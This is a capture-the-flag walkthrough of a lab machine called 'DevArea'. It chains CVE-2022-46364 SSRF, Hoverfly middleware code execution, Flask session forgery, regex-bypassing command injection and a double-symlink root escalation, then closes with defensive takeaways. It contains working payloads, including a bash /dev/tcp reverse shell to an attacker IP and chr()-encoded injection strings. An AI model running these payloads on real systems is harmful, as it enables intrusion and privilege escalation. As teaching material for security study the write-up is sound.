Machine Overview

DevArea presents as a developer hiring platform exposing multiple services. The attack involves a multi-stage chain: an anonymous FTP share leaks a vulnerable JAR that enables Server-Side Request Forgery (CVE-2022-46364), which exposes Hoverfly credentials. Hoverfly's middleware feature provides RCE as dev_ryan, and further SSRF leaks a Flask secret key, enabling session forgery and command injection against an internal monitoring dashboard to escalate to the syswatch user. Finally, a flawed symlink validation in a root-owned script completes the privilege escalation.

Foothold — SSRF via CVE-2022-46364

05
Confirming SSRF via MTOM XOP Include
Exploitation · Phase 05

MTOM (Message Transmission Optimization Mechanism) is a SOAP encoding method that supports multipart messages. Apache CXF processes xop:Include href="..." elements by fetching the URL server-side and base64-encoding the response into the SOAP field — enabling blind SSRF. A Python HTTP listener confirms the callback.

bash — MTOM SSRF payload
BOUNDARY="MIMEBoundaryurn_uuid_test123"
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H "Content-Type: multipart/related; type=\"application/xop+xml\"; \
      boundary=\"${BOUNDARY}\"; start=\"<rootpart@soapui.org>\"; \
      start-info=\"text/xml\"" \
  -d "--${BOUNDARY}
Content-Type: application/xop+xml; charset=UTF-8; type=\"text/xml\"
Content-ID: <rootpart@soapui.org>

<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"
               xmlns:tns=\"http://devarea.htb/\">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\"
                       href=\"http://10.10.14.26:9999/ssrf-test\"/>
        </content>
        <department>IT</department>
        <employeeName>John</employeeName>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>
--${BOUNDARY}--"
output — response content field
Content: U1NSRl9DT05GSVJNRUQ=  (base64 → "SSRF_CONFIRMED")
✓
SSRF Confirmed: The server fetched our controlled URL (user-agent: Java/1.8.0_482) and returned the content base64-encoded in the SOAP response. The SSRF also supports file:// URIs for local file reads.

09
Middleware RCE — Reverse Shell
Exploitation · Phase 09

Hoverfly v1.11.3 supports external middleware scripts that process every simulated request/response pair. The middleware receives JSON on stdin and must return JSON on stdout. By uploading a bash script that fires a reverse shell in the background while passing stdin to stdout via cat, the shell triggers immediately when Hoverfly validates the middleware during the PUT operation.

bash — middleware upload
TOKEN="eyJhbGciOiJIUzUxMiIs..."

curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -d '{
    "binary": "bash",
    "script": "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.26/4444 0>&1 &\ncat\n",
    "remote": ""
  }'
bash — catch reverse shell
nc -nlvp 4444
connect to [10.10.14.26] from (UNKNOWN) [10.129.26.236] 56366
dev_ryan@devarea:/opt/HoverFly$
✓
Shell Obtained: Reverse shell received as dev_ryan. The middleware reverse shell is backgrounded so cat can satisfy Hoverfly's middleware validation contract.

Flask Session Cookie Forgery
Lateral Movement · Phase 13

Flask's SecureCookieSessionInterface signs session data with the app's secret key using HMAC. With the key in hand, a valid admin session can be crafted locally and used directly without needing the password.

python3 — session forger
import flask
from flask.sessions import SecureCookieSessionInterface

app = flask.Flask('test')
app.secret_key = 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'

with app.app_context():
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    cookie = s.dumps({'user_id': 1, 'username': 'admin'})
    print(cookie)

14
Command Injection — Weak Regex Filter
Lateral Movement · Phase 14

The /service-status route passes user input directly to systemctl status --no-pager {service} via shell=True. A regex filter blocks slashes, semicolons, dots, backslashes, and uppercase letters — but leaves pipe (|), dollar, parens, backticks, and quotes unblocked, enabling injection.

python — vulnerable route
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")

def service_status():
    service = request.form.get("service", "").strip()
    if not service or not SAFE_SERVICE.match(service):
        error = "Invalid service name"
    else:
        res = subprocess.run(
            [f"systemctl status --no-pager {service}"],
            shell=True, capture_output=True, text=True, timeout=10
        )
bash — confirm injection
curl -s -b "session=$SESSION" http://127.0.0.1:7777/service-status \
  -X POST --data-urlencode 'service=| whoami'
# Output: syswatch
✕
Command Injection (CWE-78): The pipe character and subshell constructs are not blocked. The shell=True flag passes the entire string through /bin/sh -c, making any unblocked shell metacharacter exploitable.
15
Filter Bypass via chr() Encoding
Lateral Movement · Phase 15

Paths require / and . characters — both blocked. The solution: use Python's chr() to reconstruct any string from its ASCII codes, avoiding all blocked characters entirely. The exec() function evaluates the reconstructed string at runtime.

python3 — payload generator
# Target command:
# import os; os.symlink("/root/root.txt", "/opt/syswatch/logs/root.txt")
cmd = 'import os; os.symlink("/root/root.txt", "/opt/syswatch/logs/root.txt")'
payload = '+'.join(f'chr({ord(c)})' for c in cmd)
# Result: chr(105)+chr(109)+chr(112)+... (only lowercase, digits, parens, plus)
◈
Bypass Technique: The final injection payload | python3 -c 'exec(chr(105)+chr(109)+...)' uses only lowercase letters, digits, pipe, quotes, parentheses, and plus signs — none of the blocked characters.

Root — Symlink Chain Privilege Escalation

16
Vulnerable view_logs Logic in syswatch.sh
Privilege Escalation · Phase 16

The view_logs function in syswatch.sh runs as root via sudo. It checks if a log path is a symlink and validates the immediate target — but only one level deep. If the target is a simple filename, it resolves it to $LOG_DIR/target and calls cat, which follows symlinks transparently.

bash — syswatch.sh view_logs (vulnerable snippet)
if [ -L "$path" ]; then
    target=$(ls -l "$path" | awk '{print $NF}')

    # Block 1: target contains / or .. or \
    if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
        echo "[Blocked unsafe symlink target]: $file -> $target"
        return 1
    fi

    # Allow 1: target is a simple filename → resolve relative to LOG_DIR
    if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
        local resolved="$LOG_DIR/$target"
        if [ -f "$resolved" ]; then
            cat "$resolved"      # cat follows symlinks!
            return
        fi
    fi
fi
✕
Symlink Following (CWE-59): The script checks only the immediate symlink target. If $LOG_DIR/target is itself a symlink (pointing to /root/root.txt), cat follows it transparently and reads root-owned files.
17
Double Symlink Chain Exploitation
Privilege Escalation · Phase 17

Two symlinks are planted via the command injection in syswatch's context. The outer link (evil.log → root.txt) passes all validation checks. The inner link (root.txt → /root/root.txt) is never validated, so cat traverses both and reads the root flag.

bash — step 1: create inner symlink via chr() injection
# Payload: import os; os.symlink("/root/root.txt", "/opt/syswatch/logs/root.txt")
curl -s -b "session=$SESSION" http://127.0.0.1:7777/service-status \
  -X POST --data-urlencode "service=| python3 -c 'exec(chr(105)+...+chr(41))'"
bash — step 2: create outer symlink (relative)
# Payload: import os; os.symlink("root.txt", "/opt/syswatch/logs/evil.log")
curl -s -b "session=$SESSION" http://127.0.0.1:7777/service-status \
  -X POST --data-urlencode "service=| python3 -c 'exec(chr(105)+...+chr(41))'"
output — symlink chain state
/opt/syswatch/logs/evil.log → root.txt          (relative — passes check ✓)
/opt/syswatch/logs/root.txt → /root/root.txt    (absolute — never checked ✓)
bash — step 3: trigger root read
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs evil.log
◈
Execution Flow: (1) evil.log target is root.txt — no slash, no dots, passes regex. (2) Resolved to /opt/syswatch/logs/root.txt. (3) -f test follows symlinks, finds /root/root.txt → true. (4) cat follows both symlinks and reads as root.

key takeaways
// 01
SSRF Enables Lateral Data Exfiltration
CVE-2022-46364 demonstrates how a SOAP-layer SSRF can read arbitrary local files via file:// URIs. Secrets stored in systemd service files and environment files become fully exposed. Applications processing external XML must disable XOP/MTOM href fetching or enforce strict URI allowlisting.
// 02
Credentials Must Not Be CLI Arguments
Hoverfly's -password flag makes the credential visible in ps auxww, /proc/[pid]/cmdline, and service definition files. Secrets must be supplied via environment variables, config files with restricted permissions, or dedicated secrets managers — never inline in a command invocation.
// 03
Flask Secret Keys Must Remain Secret
Flask's signed session cookies are only as secure as the secret key. Once an attacker obtains the key, they can forge any session identity without knowing passwords. Secret keys must never appear in environment files readable by other processes, and should be rotated immediately if compromise is suspected.
// 04
Regex Allowlists Must Cover All Attack Primitives
The SAFE_SERVICE regex blocked obvious characters but left pipe, subshells, and chr()-based payloads entirely functional. Blocklist-based filters are inherently fragile against creative encoding. The correct fix is strict allowlisting (only alphanumerics, hyphens, and dots for service names) combined with avoiding shell=True.
// 05
Symlink Validation Requires Full Chain Inspection
Validating only the immediate symlink target is insufficient when the resolved path can itself be a symlink. Any privileged file-read function must resolve the full symlink chain (e.g. via realpath) and verify the final target is within an allowed directory before performing any I/O.
// 06
Internal Services Are Not Implicitly Trusted
The Hoverfly middleware API and the SysWatch Flask GUI were treated as internal-only and therefore safe. However, SSRF and compromised service accounts can pivot to any locally bound service. All internal services must enforce authentication, least-privilege execution, and input validation regardless of whether they are internet-facing.
